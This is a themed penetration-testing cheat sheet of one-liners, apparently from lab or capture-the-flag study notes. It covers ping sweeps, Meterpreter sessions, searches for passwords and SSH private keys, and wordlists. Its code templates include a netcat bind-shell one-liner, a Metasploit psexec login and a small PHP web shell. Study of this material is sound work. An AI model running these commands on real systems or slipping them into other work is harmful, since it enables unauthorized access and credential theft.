# 🧠 General

<link rel="stylesheet" href="styles/code-blocks.css">

This unholy scroll gathers essential one-liners and spectral commands — rites forged to uncover hidden paths to wordlists, summon critical data from the void, or inject precise strings into cursed systems. These are the foundational whispers you'll return to when navigating the abyss of reconnaissance, enumeration, and interaction with ancient services.

---

<details>
<summary><h2>🌐 Get Network Interfaces</h2></summary>

<details>
<summary><h3>🪟 Windows</h3></summary>

<details>
<summary><h4>PowerShell</h4></summary>

List all IPv4 addresses with interface names (detailed)  

<!-- POWERSHELL BLOCK -->
<div class="code-block ps-block">
  <div class="code-header ps-header">
    🔵 PowerShell
  </div>
  <div class="code-content ps-content">
Get-NetIPAddress -AddressFamily IPv4 | Format-Table InterfaceAlias, IPAddress
  </div>
</div>
<!-- END POWERSHELL BLOCK -->

List interfaces with IPv4 addresses (filtered, concise)  

<!-- POWERSHELL BLOCK -->
<div class="code-block ps-block">
  <div class="code-header ps-header">
    🔵 PowerShell
  </div>
  <div class="code-content ps-content">
Get-NetIPConfiguration | Where-Object { $_.IPv4Address } | Select-Object InterfaceAlias, @{n='IPv4';e={$_.IPv4Address.IPAddress}}
  </div>
</div>
<!-- END POWERSHELL BLOCK -->

</details>

<details>
<summary><h4>CMD</h4></summary>

Show all network configuration details

<!-- CMD BLOCK -->
<div class="code-block cmd-block">
  <div class="code-header cmd-header">
    🪟 CMD
  </div>
  <div class="code-content cmd-content">
ipconfig /all
  </div>
</div>
<!-- END CMD BLOCK -->

Show only IPv4 addresses and adapter names

<!-- CMD BLOCK -->
<div class="code-block cmd-block">
  <div class="code-header cmd-header">
    🪟 CMD — <b>DC01</b>
  </div>
  <div class="code-content cmd-content">
ipconfig /all | findstr /R /C:"IPv4 Address" /C:"adapter"
  </div>
</div>
<!-- END CMD BLOCK -->

</details>

</details>

<details>
<summary><h3>🐧 Linux</h3></summary>

Show all network interfaces and addresses (modern)

<!-- BASH BLOCK -->
<div class="code-block bash-block">
  <div class="code-header bash-header">
    🐧 bash — <b>Linux</b>
  </div>
  <div class="code-content bash-content">
ip addr
  </div>
</div>
<!-- END BASH BLOCK -->

One-line summary of all interfaces and addresses

<!-- BASH BLOCK -->
<div class="code-block bash-block">
  <div class="code-header bash-header">
    🐧 bash — <b>Linux</b>
  </div>
  <div class="code-content bash-content">
ip -o addr | awk -F ' +|/' '/inet/ {print $2, $4}'
  </div>
</div>
<!-- END BASH BLOCK -->

One-line summary of IPv4 addresses only

<!-- BASH BLOCK -->
<div class="code-block bash-block">
  <div class="code-header bash-header">
    🐧 bash — <b>Linux</b>
  </div>
  <div class="code-content bash-content">
ip -4 -o addr | awk -F ' +|/' '/inet/ {print $2, $4}'
  </div>
</div>
<!-- END BASH BLOCK -->

Legacy: Show all interfaces and IPv4 addresses

<!-- BASH BLOCK -->
<div class="code-block bash-block">
  <div class="code-header bash-header">
    🐧 bash — <b>Linux</b>
  </div>
  <div class="code-content bash-content">
ifconfig -a | grep -w inet | awk '{print $1, $2}'
  </div>
</div>
<!-- END BASH BLOCK -->

</details>

</details>

---

<details>
<summary><h3>📶 Ping Sweep</h3></summary>

**Ping Sweep For Loop on Linux Pivot Hosts**
<!-- BASH BLOCK -->
<div class="code-block bash-block">
  <div class="code-header bash-header">
    🐧 bash — <b>Linux</b>
  </div>
  <div class="code-content bash-content">
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done

<span class="code-comment"># 64 bytes from 172.16.5.19: icmp_seq=1 ttl=128 time=0.233 ms</span>
<span class="code-comment"># 64 bytes from 172.16.5.129: icmp_seq=1 ttl=64 time=0.030 ms</span>
  </div>
</div>
<!-- END BASH BLOCK -->

**Ping Sweep For Loop Using CMD**
<!-- CMD BLOCK -->
<div class="code-block cmd-block">
  <div class="code-header cmd-header">
    🪟 CMD
  </div>
  <div class="code-content cmd-content">
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

<span class="cmd-comment">...</span>
<span class="cmd-comment">ping 172.16.5.19 -n 1 -w 100   | find "Reply"</span>
<span class="cmd-comment">Reply from 172.16.5.19: bytes=32 time&lt;1ms TTL=128</span>
<span class="cmd-comment">...</span>
<span class="cmd-comment">ping 172.16.5.129 -n 1 -w 100   | find "Reply"</span>
<span class="cmd-comment">Reply from 172.16.5.129: bytes=32 time&lt;1ms TTL=64</span>
<span class="cmd-comment">...</span>
  </div>
</div>
<!-- END CMD BLOCK -->

**Ping Sweep Using PowerShell**

<!-- POWERSHELL BLOCK -->
<div class="code-block ps-block">
  <div class="code-header ps-header">
    🔵 PowerShell
  </div>
  <div class="code-content ps-content">
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}

<span class="code-comment">...</span>
<span class="code-comment">172.16.5.18: False</span>
<span class="code-comment">172.16.5.19: True</span>
<span class="code-comment">172.16.5.20: False</span>
<span class="code-comment">...</span>
<span class="code-comment">172.16.5.128: False</span>
<span class="code-comment">172.16.5.129: True</span>
<span class="code-comment">172.16.5.130: False</span>
<span class="code-comment">...</span>
  </div>
</div>
<!-- END POWERSHELL BLOCK -->

**Ping Sweep using Meterpreter**
<!-- METASPLOIT BLOCK -->
<div class="code-block msf-block">
  <div class="code-header msf-header">
    💀 Metasploit
  </div>
  <div class="code-content msf-content">
[msf](Jobs:1 Agents:1) auxiliary(server/socks_proxy) >> sessions -i 1
<span class="cmd-comment"># [*] Starting interaction with 1...</span>

(Meterpreter 1)(/home/ubuntu) > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
<span class="cmd-comment"># [*] Performing ping sweep for IP range 172.16.5.0/23</span>

<span class="cmd-comment"># [+] 	172.16.5.19 host found</span>
<span class="cmd-comment"># [+] 	172.16.5.129 host found</span>
  </div>
</div>
<!-- END METASPLOIT BLOCK -->

> **NOTE:** It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build its arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built.

If a host's firewall blocks **ICMP**, a ping sweep will not provide useful results. In such cases, we can switch to a **TCP-based scan** of the **172.16.5.0/23** network using Nmap. This allows us to identify live hosts and open ports without relying on ICMP responses.

</details>

---

<details>
<summary><h2>🔍 Find</h2></summary>

<details>
<summary><h3>🪟 Windows</h3></summary>

<details>
<summary><h4>PowerShell</h4></summary>

Recursively find files named flag.txt and show full paths

<!-- POWERSHELL BLOCK -->
<div class="code-block ps-block">
  <div class="code-header ps-header">
    🔵 PowerShell
  </div>
  <div class="code-content ps-content">
Get-ChildItem -Path C:\ -Recurse -Filter "flag.txt" -File -ErrorAction SilentlyContinue | Select-Object FullName
  </div>
</div>
<!-- END POWERSHELL BLOCK -->

Recursively search for the string "password" in config/text files and list file names

<!-- POWERSHELL BLOCK -->
<div class="code-block ps-block">
  <div class="code-header ps-header">
    🔵 PowerShell
  </div>
  <div class="code-content ps-content">
Get-ChildItem -Path Y:\ -Recurse -Include *.txt,*.ini,*.cfg,*.config,*.xml,*.git,*.ps1,*.yml -File -ErrorAction SilentlyContinue |
    Select-String -Pattern "password" -List |
    Select-Object -ExpandProperty Path
  </div>
</div>
<!-- END POWERSHELL BLOCK -->

Recursively search for the string "password", "passwd", "admin" and "creds" in xml/text files and list file names in multiple shares/drives

<!-- POWERSHELL BLOCK -->
<div class="code-block ps-block">
  <div class="code-header ps-header">
    🔵 PowerShell
  </div>
  <div class="code-content ps-content">
Get-ChildItem -Path Y:\,X:\,Z:\,W:\,V:\,U:\ -Recurse -Include *.txt,*.xml -ErrorAction SilentlyContinue | Select-String -Pattern "password|passwd|admin|creds" -List | Select-Object -Unique Path
  </div>
</div>
<!-- END POWERSHELL BLOCK -->

Recursively search for the string "password" in ALL files and list file names

<!-- POWERSHELL BLOCK -->
<div class="code-block ps-block">
  <div class="code-header ps-header">
    🔵 PowerShell
  </div>
  <div class="code-content ps-content">
Get-ChildItem -Path Z:\ -Recurse -Include *.* -File -ErrorAction SilentlyContinue |
    Select-String -Pattern "password" -List |
    Select-Object -ExpandProperty Path
  </div>
</div>
<!-- END POWERSHELL BLOCK -->

List all available shares

<!-- POWERSHELL BLOCK -->
<div class="code-block ps-block">
  <div class="code-header ps-header">
    🔵 PowerShell
  </div>
  <div class="code-content ps-content">
Get-SmbShare
  </div>
</div>
<!-- END POWERSHELL BLOCK -->

</details>

<details>
<summary><h4>CMD</h4></summary>

Recursively search for flag.txt in the current directory (including subdirectories)

<!-- CMD BLOCK -->
<div class="code-block cmd-block">
  <div class="code-header cmd-header">
    🪟 CMD
  </div>
  <div class="code-content cmd-content">
dir flag.txt /S /P
  </div>
</div>
<!-- END CMD BLOCK -->

Recursively search all text and config files for the string "password" (case-insensitive)

<!-- CMD BLOCK -->
<div class="code-block cmd-block">
  <div class="code-header cmd-header">
    🪟 CMD
  </div>
  <div class="code-content cmd-content">
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
  </div>
</div>
<!-- END CMD BLOCK -->

</details>
</details>

<details>
<summary><h3>🐧 Linux</h3></summary>

Recursively find files named flag.txt, suppress errors

<!-- BASH BLOCK -->
<div class="code-block bash-block">
  <div class="code-header bash-header">
    🐧 bash — <b>Linux</b>
  </div>
  <div class="code-content bash-content">
find / -type f -iname flag.txt 2>/dev/null
  </div>
</div>
<!-- END BASH BLOCK -->

Find files by extension

<!-- BASH BLOCK -->
<div class="code-block bash-block">
  <div class="code-header bash-header">
    🐧 bash — <b>Linux</b>
  </div>
  <div class="code-content bash-content">
for ext in $(echo ".txt .env .xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
  </div>
</div>
<!-- END BASH BLOCK -->

Find SSH Keys

<!-- BASH BLOCK -->
<div class="code-block bash-block">
  <div class="code-header bash-header">
    🐧 bash — <b>Linux</b>
  </div>
  <div class="code-content bash-content">
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
  </div>
</div>
<!-- END BASH BLOCK -->

</details>

</details>

---

<details>
<summary><h2>🚢 Common Ports</h2></summary>

| TCP Port | TCP Service                         | UDP Port | UDP Service            |
|----------|--------------------------------------|----------|-------------------------|
| 1        | tcpmux                               | 1        | N/A                     |
| 3        | CompressNET                          | 7        | Echo                    |
| 5        | RJE                                  | 9        | Discard                 |
| 7        | Echo                                 | 17       | QOTD                    |
| 9        | Discard                              | 19       | Chargen                 |
| 11       | SYSTAT                               | 37       | Time                    |
| 13       | Daytime                              | 49       | TACACS                  |
| 17       | QOTD                                 | 53       | DNS                     |
| 18       | Message Send Protocol                | 67       | DHCP Server             |
| 19       | Chargen                              | 68       | DHCP Client             |
| 20       | FTP Data                             | 69       | TFTP                    |
| 21       | FTP Control                          | 111      | RPCbind                 |
| 22       | SSH                                  | 123      | NTP                     |
| 23       | Telnet                               | 135      | MS RPC                  |
| 25       | SMTP                                 | 137      | NetBIOS Name Service    |
| 37       | Time                                 | 138      | NetBIOS Datagram        |
| 39       | RLP                                  | 161      | SNMP                    |
| 42       | WINS Replication                     | 162      | SNMP Trap               |
| 43       | WHOIS                                | 177      | XDMCP                   |
| 49       | TACACS                               | 500      | ISAKMP                  |
| 53       | DNS                                  | 514      | Syslog                  |
| 70       | Gopher                               | 520      | RIP                     |
| 79       | Finger                               | 631      | IPP                     |
| 80       | HTTP                                 | 1434     | MSSQL Monitor           |
| 88       | Kerberos                             | 1645     | RADIUS (alt)            |
| 109      | POP2                                 | 1646     | RADIUS Accounting       |
| 110      | POP3                                 | 1812     | RADIUS                  |
| 111      | RPCbind                              | 1813     | RADIUS Accounting       |
| 113      | Ident                                | 2049     | NFS                     |
| 119      | NNTP                                 | 2222     | DirectAdmin             |
| 123      | NTP                                  | 3306     | MySQL                   |
| 135      | MS RPC                               | 3456     | VAT                     |
| 139      | NetBIOS                              | 3702     | WS-Discovery            |
| 143      | IMAP                                 | 4500     | IPsec NAT-T             |
| 161      | SNMP                                 | 5353     | mDNS                    |
| 179      | BGP                                  | 5060     | SIP                     |
| 194      | IRC                                  | 5355     | LLMNR                   |
| 201      | AppleTalk                            | 6000     | X11                     |
| 220      | IMAP3                                | 10000    | Webmin                  |
| 389      | LDAP                                 | 17185    | Sounds Virtual          |
| 443      | HTTPS                                | 49152    | Windows RPC Dynamic     |
| 445      | SMB                                  |          |                         |
| 464      | Kerberos Change/Set Password         |          |                         |
| 465      | SMTPS                                |          |                         |
| 514      | Shell                                |          |                         |
| 515      | Printer                              |          |                         |
| 543      | Kerberos login                       |          |                         |
| 544      | Kerberos shell                       |          |                         |
| 548      | AFP                                  |          |                         |
| 554      | RTSP                                 |          |                         |
| 587      | SMTP Submission                      |          |                         |
| 631      | IPP                                  |          |                         |
| 636      | LDAPS                                |          |                         |
| 646      | LDP                                  |          |                         |
| 873      | rsync                                |          |                         |
| 990      | FTPS                                 |          |                         |
| 993      | IMAPS                                |          |                         |
| 995      | POP3S                                |          |                         |
| 1025     | Microsoft RPC                        |          |                         |
| 1080     | SOCKS                                |          |                         |
| 1194     | OpenVPN                              |          |                         |
| 1433     | MSSQL                                |          |                         |
| 1434     | MSSQL Monitor                        |          |                         |
| 1521     | Oracle DB                            |          |                         |
| 1723     | PPTP                                 |          |                         |
| 2049     | NFS                                  |          |                         |
| 2082     | cPanel                               |          |                         |
| 2083     | cPanel SSL                           |          |                         |
| 2100     | Oracle XDB                           |          |                         |
| 2483     | Oracle DB Listener                   |          |                         |
| 2484     | Oracle DB Listener SSL               |          |                         |
| 3128     | Squid Proxy                          |          |                         |
| 3306     | MySQL                                |          |                         |
| 3389     | RDP                                  |          |                         |
| 3690     | Subversion                           |          |                         |
| 4444     | Metasploit                           |          |                         |
| 4664     | Google Desktop                       |          |                         |
| 4899     | Radmin                               |          |                         |
| 5000     | UPnP                                 |          |                         |
| 5060     | SIP                                  |          |                         |
| 5432     | PostgreSQL                           |          |                         |
| 5500     | VNC                                  |          |                         |
| 5631     | pcAnywhere                           |          |                         |
| 5900     | VNC                                  |          |                         |
| 6000     | X11                                  |          |                         |
| 6667     | IRC                                  |          |                         |
| 7000     | AFS                                  |          |                         |
| 8000     | HTTP Alt                             |          |                         |
| 8080     | HTTP Proxy                           |          |                         |
| 8443     | HTTPS Alt                            |          |                         |
| 8888     | HTTP Alt                             |          |                         |
| 9100     | Printer                              |          |                         |
| 9999     | Abyss Web Server                     |          |                         |
| 10000    | Webmin                               |          |                         |
| 32768    | Windows RPC                          |          |                         |
| 49152    | Windows RPC Dynamic                  |          |                         |

</details>


---

<details>
<summary><h2>📝 Add host to /etc/hosts/</summary>
  
<!-- BASH BLOCK -->
<div class="code-block bash-block">
  <div class="code-header bash-header">
    🐧 bash — <b>Linux</b>
  </div>
  <div class="code-content bash-content">
echo "&lt;IP&gt; &lt;DOMAIN&gt;" | sudo tee -a /etc/hosts
  </div>
</div>
<!-- END BASH BLOCK -->
  
</details>

---

<details>
<summary><h2>📁 Folders</summary>
  
<!-- BASH BLOCK -->
<div class="code-block bash-block">
  <div class="code-header bash-header">
    🐧 bash — <b>Linux</b>
  </div>
  <div class="code-content bash-content">
tree .
  </div>
</div>
<!-- END BASH BLOCK -->
  
</details>

---

<details>
<summary><h2>📋 Wordlists</summary>

Unzip rockyou from SecLists

<!-- BASH BLOCK -->
<div class="code-block bash-block">
  <div class="code-header bash-header">
    🐧 bash — <b>Linux</b>
  </div>
  <div class="code-content bash-content">
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
  </div>
</div>
<!-- END BASH BLOCK -->

SecLists

<!-- BASH BLOCK -->
<div class="code-block bash-block">
  <div class="code-header bash-header">
    🐧 bash — <b>Linux</b>
  </div>
  <div class="code-content bash-content">
<span class="code-comment"># APIs</span>
    /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

<span class="code-comment"># Subdomains and VHOSTS</span>
    /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
    /usr/share/seclists/Discovery/Web-Content/vhosts.txt

<span class="code-comment"># Generic Files and Routes</span>
    /usr/share/wordlists/dirb/common.txt
    /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
    /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
    /usr/share/seclists/Discovery/Web-Content/Common-DB-Backups.txt
    /usr/share/seclists/Discovery/Web-Content/Configuration-Files.txt
    /usr/share/seclists/Discovery/Web-Content/Logs.txt

<span class="code-comment"># Specific Technologies</span>
    /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.txt
    /usr/share/seclists/Discovery/Web-Content/jenkins.txt
    /usr/share/seclists/Discovery/Web-Content/cloud-metadata.txt

<span class="code-comment"># Users</span>
    /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
    /usr/share/seclists/Usernames/top-usernames-shortlist.txt

<span class="code-comment"># Passwords</span>
    /usr/share/wordlists/rockyou.txt
    /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
  </div>
</div>
<!-- END BASH BLOCK -->

</details>

---

<details>
<summary><h2>📃 Code Templates</h2></summary>

| Prefix | Block | Theme | Comment Syntax |
|--------|-------|-------|----------------|
| `!ps` | PowerShell | Blue | `# ...` |
| `!cmd` | CMD Windows | Black | `REM ...` |
| `!bash` | Bash Linux | Gray | `# ...` |
| `!basha` | Bash AttackHost | Green | `# ...` |
| `!basht` | Bash Target | Blue | `# ...` |
| `!bashp` | Bash Pivot | Orange | `# ...` |
| `!msf` | Metasploit | Dark red | `# ...` |
| `!js` | JavaScript | Yellow | `// ...` |
| `!php` | PHP | Purple | `// ...` |
| `!ruby` | Ruby | Red | `# ...` |
| `!sql` | SQL | Cyan | `-- ...` |
| `!py` | Python | Blue/Yellow | `# ...` |
| `!txt` | Text/Output | Gray | *(none)* |
| `!note` | Note | Yellow | *(none)* |

<!-- POWERSHELL BLOCK -->
<div class="code-block ps-block">
  <div class="code-header ps-header">
    🔵 PowerShell — <b>WS01</b>
  </div>
  <div class="code-content ps-content">
Get-NetIPAddress -AddressFamily IPv4 | Format-Table InterfaceAlias, IPAddress
  </div>
</div>
<!-- END POWERSHELL BLOCK -->

<!-- CMD BLOCK -->
<div class="code-block cmd-block">
  <div class="code-header cmd-header">
    🪟 CMD — <b>DC01</b>
  </div>
  <div class="code-content cmd-content">
ipconfig /all
  </div>
</div>
<!-- END CMD BLOCK -->

<!-- BASH BLOCK -->
<div class="code-block bash-target-block">
  <div class="code-header bash-target-header">
    🐧 bash — <b>Target</b>
  </div>
  <div class="code-content bash-target-content">
<span class="code-comment"># Runs an nmap scan to discover ip addresses</span>
sudo nmap 10.129.2.0/24 -sn | grep for | cut -d" " -f5
  </div>
</div>
<!-- END BASH BLOCK -->

<!-- BASH BLOCK -->
<div class="code-block bash-attack-block">
  <div class="code-header bash-attack-header">
    🐧 bash — <b>AttackHost</b>
  </div>
  <div class="code-content bash-attack-content">
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 4444 > /tmp/f
  </div>
</div>
<!-- END BASH BLOCK -->

<!-- BASH BLOCK -->
<div class="code-block bash-pivot-block">
  <div class="code-header bash-pivot-header">
    🐧 bash — <b>Pivot</b>
  </div>
  <div class="code-content bash-pivot-content">
python2.7 client.py --server-ip 10.10.15.165 --server-port 9999
  </div>
</div>
<!-- END BASH BLOCK -->

<!-- BASH BLOCK -->
<div class="code-block bash-block">
  <div class="code-header bash-header">
    🐧 bash — <b>Linux</b>
  </div>
  <div class="code-content bash-content">
tree .
  </div>
</div>
<!-- END BASH BLOCK -->

<!-- METASPLOIT BLOCK -->
<div class="code-block msf-block">
  <div class="code-header msf-header">
    💀 Metasploit — <b>AttackHost</b>
  </div>
  <div class="code-content msf-content">
msfconsole
use exploit/windows/smb/psexec
set RHOSTS 10.10.10.5
set SMBUser Administrator
set SMBPass 'Summer2025!'
run
  </div>
</div>
<!-- END METASPLOIT BLOCK -->

<!-- JAVASCRIPT BLOCK -->
<div class="code-block js-block">
  <div class="code-header js-header">
    🟨 JavaScript — <b>PayloadGen</b>
  </div>
  <div class="code-content js-content">
fetch("http://target/login", {
  method: "POST",
  body: JSON.stringify({user:"admin",pass:"admin"})
});
  </div>
</div>
<!-- END JAVASCRIPT BLOCK -->

<!-- PHP BLOCK -->
<div class="code-block php-block">
  <div class="code-header php-header">
    🟦 PHP — <b>WebShell</b>
  </div>
  <div class="code-content php-content">
&lt;?php
echo shell_exec("whoami");
?&gt;
  </div>
</div>
<!-- END PHP BLOCK -->

<!-- RUBY BLOCK -->
<div class="code-block ruby-block">
  <div class="code-header ruby-header">
    ❤️ Ruby — <b>ExploitScript</b>
  </div>
  <div class="code-content ruby-content">
require 'socket'
s = TCPSocket.new("10.10.10.5", 80)
s.puts("GET / HTTP/1.1\r\nHost: test\r\n\r\n")
puts s.read
  </div>
</div>
<!-- END RUBY BLOCK -->

<!-- SQL BLOCK -->
<div class="code-block sql-block">
  <div class="code-header sql-header">
    🟩 SQL — <b>HR-DB</b>
  </div>
  <div class="code-content sql-content">
SELECT username, last_login
FROM employees
WHERE role = 'manager';
  </div>
</div>
<!-- END SQL BLOCK -->

<!-- TXT BLOCK -->
<div class="code-block txt-block">
  <div class="code-header txt-header">
    📄 Text — <b>ScanOutput</b>
  </div>
  <div class="code-content txt-content">
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
445/tcp  open  microsoft-ds
  </div>
</div>
<!-- END TXT BLOCK -->

</details>

---

📘 **Next step:** Continue with [FOOTPRINTING](./01-footprinting.md)
